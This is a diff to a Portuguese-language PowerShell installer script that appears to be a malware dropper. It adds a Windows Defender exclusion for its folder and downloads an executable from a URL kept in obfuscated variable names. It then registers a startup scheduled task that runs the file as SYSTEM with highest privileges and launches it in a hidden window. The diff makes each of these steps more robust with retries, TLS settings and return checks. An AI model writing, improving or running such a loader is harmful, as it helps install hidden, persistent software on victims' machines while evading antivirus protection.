@@ -28,12 +28,15 @@ function Add-DefenderExclusion {
         if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
             Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
             Write-Host "Exclusão adicionada com sucesso!" -ForegroundColor Green
+            return $true
         } else {
             Write-Warning "Windows Defender não encontrado ou não disponível."
+            return $false
         }
     } catch {
         Write-Warning "Falha ao adicionar exclusão no Windows Defender: $_"
         Write-Warning "Tente executar como administrador ou adicione manualmente."
+        return $false
     }
 }
 
@@ -46,20 +49,28 @@ function Download-File {
         [int]$Retries = 3
     )
     
+    # Configura TLS para compatibilidade
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+    
     for ($i = 0; $i -lt $Retries; $i++) {
         try {
             Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
+            
+            # Usa Invoke-WebRequest (sem WebClient)
             Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
+            
             Write-Host "Download concluído com sucesso!" -ForegroundColor Green
-            return
+            return $true
         } catch {
             if ($i -eq ($Retries - 1)) {
-                throw "Falha ao baixar o arquivo após $Retries tentativas: $_"
+                Write-Error "Falha ao baixar o arquivo após $Retries tentativas: $_"
+                return $false
             }
             Write-Host "Tentativa $($i+1) falhou, tentando novamente em 2 segundos..."
             Start-Sleep -Seconds 2
         }
     }
+    return $false
 }
 
 function Add-ScheduledTask {
@@ -80,57 +91,50 @@ function Add-ScheduledTask {
             Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
         }
         
-        # Cria a tarefa usando schtasks.exe diretamente com todos os parâmetros necessários
-        $comandoSchTasks = @"
-schtasks /create /tn "$Nome" /tr "$CaminhoExecutavel" /sc onstart /ru SYSTEM /rl HIGHEST /f
-"@
+        # Usa schtasks.exe com aspas corretas para caminhos com espaços
+        $schtaskCommand = "schtasks /create /tn `"$Nome`" /tr `"$CaminhoExecutavel`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
         
-        Write-Host "Executando: $comandoSchTasks"
+        Write-Host "Executando: $schtaskCommand"
         
         # Executa o comando e captura a saída
-        $resultado = Invoke-Expression $comandoSchTasks 2>&1
+        $result = Invoke-Expression $schtaskCommand 2>&1
         
-        # Verifica se o comando foi executado com sucesso
-        if ($LASTEXITCODE -eq 0) {
+        if ($LASTEXITCODE -ne 0) {
+            throw "Falha ao criar tarefa. Código de saída: $LASTEXITCODE. Saída: $result"
+        }
+        
+        # Verifica se a tarefa foi criada
+        $tarefaVerificacao = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
+        if ($tarefaVerificacao) {
             Write-Host "Tarefa '$Nome' criada com sucesso!" -ForegroundColor Green
-            
-            # Verifica se a tarefa foi realmente criada
-            $tarefaVerificacao = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
-            if ($tarefaVerificacao) {
-                Write-Host "✅ Tarefa verificada e ativa no sistema." -ForegroundColor Green
-            } else {
-                Write-Warning "⚠️ Tarefa criada mas não encontrada na verificação."
-            }
+            Write-Host "✅ Tarefa verificada e ativa no sistema." -ForegroundColor Green
+            return $true
         } else {
-            throw "Falha ao criar tarefa. Código de saída: $LASTEXITCODE`nSaída: $resultado"
+            Write-Warning "Tarefa criada mas não encontrada na verificação."
+            return $false
         }
         
     } catch {
-        Write-Error "Erro ao criar tarefa no agendador: $_"
-        Write-Host "`nTentando método alternativo..." -ForegroundColor Yellow
-        
-        # Método alternativo usando o módulo ScheduledTasks (fallback)
-        try {
-            Import-Module ScheduledTasks -ErrorAction Stop
-            
-            $Acao = New-ScheduledTaskAction -Execute $CaminhoExecutavel
-            $Gatilho = New-ScheduledTaskTrigger -AtStartup
-            $Configuracoes = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
-            
-            Register-ScheduledTask -TaskName $Nome -Action $Acao -Trigger $Gatilho -Settings $Configuracoes -User "SYSTEM" -RunLevel Highest -Force -ErrorAction Stop
-            
-            Write-Host "Tarefa '$Nome' criada com sucesso (método alternativo)!" -ForegroundColor Green
-        } catch {
-            Write-Error "Falha no método alternativo também: $_"
-            throw "Não foi possível criar a tarefa no agendador."
-        }
+        Write-Error "Falha ao criar tarefa no agendador: $_"
+        return $false
     }
 }
 
 function Main {
     $isAdmin = Test-IsAdmin
+    
+    Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
+    Write-Host "URL: $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL"
+    Write-Host "Destino: $asokimasoaosmodasmodpaD"
+    Write-Host "Nome da Tarefa: $TksdaoqawopqwNisadnia"
+    Write-Host "Modo Administrador: $isAdmin"
+    Write-Host ""
+    
     if (-not $isAdmin) {
-        Write-Warning "Este script requer privilégios de administrador para algumas operações."
+        Write-Warning "⚠️  Este script requer privilégios de administrador para funcionar completamente."
+        Write-Warning "Para instalação completa, execute como Administrador."
+        Write-Host ""
+        
         $confirma = Read-Host "Deseja continuar mesmo assim? (S/N)"
         if ($confirma -ne 'S' -and $confirma -ne 's') {
             Write-Host "Script cancelado pelo usuário."
@@ -139,12 +143,6 @@ function Main {
     }
     
     try {
-        Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
-        Write-Host "URL: $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL"
-        Write-Host "Destino: $asokimasoaosmodasmodpaD"
-        Write-Host "Nome da Tarefa: $TksdaoqawopqwNisadnia"
-        Write-Host ""
-        
         # 1. Cria a pasta de destino
         Write-Host "Passo 1/4: Criando diretório..."
         if (-not (Test-Path -Path $asokimasoaosmodasmodpaD)) {
@@ -154,15 +152,15 @@ function Main {
             Write-Host "Diretório já existe: $asokimasoaosmodasmodpaD"
         }
         
-        # Adiciona exclusão no Windows Defender
+        # 2. Adiciona exclusão no Windows Defender
         if ($isAdmin) {
             Write-Host "`nPasso 2/4: Configurando exclusão no Windows Defender..."
             Add-DefenderExclusion -Path $asokimasoaosmodasmodpaD
         } else {
-            Write-Warning "Não é administrador. Pulando exclusão do Defender."
+            Write-Warning "⚠️  Não é administrador. Pulando exclusão do Defender."
         }
         
-        # 2. Baixa o executável
+        # 3. Baixa o executável
         Write-Host "`nPasso 3/4: Baixando executável..."
         $nomeArquivo = [System.IO.Path]::GetFileName($ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL)
         if ([string]::IsNullOrEmpty($nomeArquivo)) {
@@ -170,34 +168,61 @@ function Main {
         }
         $caminhoCompleto = Join-Path -Path $asokimasoaosmodasmodpaD -ChildPath $nomeArquivo
         
-        Download-File -Url $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $caminhoCompleto
+        $downloadSuccess = Download-File -Url $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $caminhoCompleto
         
-        # 3. Cria tarefa no agendador
-        Write-Host "`nPasso 4/4: Configurando tarefa no agendador..."
-        if ($isAdmin) {
-            Add-ScheduledTask -Nome $TksdaoqawopqwNisadnia -CaminhoExecutavel $caminhoCompleto
-        } else {
-            Write-Warning "Não é administrador. Não é possível criar tarefa no agendador."
-            Write-Warning "Para criar a tarefa manualmente, execute como administrador:"
-            Write-Warning "schtasks /create /tn '$TksdaoqawopqwNisadnia' /tr '$caminhoCompleto' /sc onstart /ru SYSTEM /rl HIGHEST"
+        if (-not $downloadSuccess) {
+            throw "Falha no download do arquivo. Verifique a URL e a conexão com internet."
         }
         
-        # 4. Inicia o executável
+        # Verifica se o arquivo foi baixado
+        if (-not (Test-Path -Path $caminhoCompleto)) {
+            throw "Arquivo não encontrado após download: $caminhoCompleto"
+        }
+        
+        # 4. Cria tarefa no agendador
+        Write-Host "`nPasso 4/4: Configurando tarefa no agendador..."
+        if ($isAdmin) {
+            $taskSuccess = Add-ScheduledTask -Nome $TksdaoqawopqwNisadnia -CaminhoExecutavel $caminhoCompleto
+            
+            if (-not $taskSuccess) {
+                Write-Warning "⚠️  Falha ao criar tarefa automaticamente."
+                Write-Host "Para criar manualmente, execute como administrador:"
+                Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
+            }
+        } else {
+            Write-Warning "⚠️  Não é administrador. Não é possível criar tarefa no agendador."
+            Write-Host "Para criar a tarefa manualmente, execute como administrador:"
+            Write-Host "schtasks /create /tn `"$TksdaoqawopqwNisadnia`" /tr `"$caminhoCompleto`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
+        }
+        
+        # 5. Inicia o executável
         Write-Host "`nIniciando executável..."
         if (Test-Path -Path $caminhoCompleto) {
-            Start-Process -FilePath $caminhoCompleto -WindowStyle Hidden
-            Write-Host "Processo iniciado com sucesso!" -ForegroundColor Green
+            try {
+                Start-Process -FilePath $caminhoCompleto -WindowStyle Hidden -ErrorAction Stop
+                Write-Host "✅ Processo iniciado com sucesso!" -ForegroundColor Green
+            } catch {
+                Write-Warning "Não foi possível iniciar o processo automaticamente."
+                Write-Host "Execute manualmente: $caminhoCompleto"
+            }
         } else {
             throw "Arquivo não encontrado para iniciar: $caminhoCompleto"
         }
         
-        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA COM SUCESSO ===" -ForegroundColor Green
+        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA ===" -ForegroundColor Green
+        Write-Host "📁 Pasta: $asokimasoaosmodasmodpaD"
+        Write-Host "📄 Arquivo: $caminhoCompleto"
+        if ($isAdmin) {
+            Write-Host "⏰ Tarefa: $TksdaoqawopqwNisadnia (inicia com o Windows)"
+            Write-Host "🛡️  Exclusão do Defender: Aplicada"
+        }
         
     } catch {
-        Write-Error "Erro durante a instalação: $_"
+        Write-Error "❌ Erro durante a instalação: $_"
         Write-Host "`n=== INSTALAÇÃO FALHOU ===" -ForegroundColor Red
         Exit 1
     }
 }
 
+# Executa a função principal
 Main
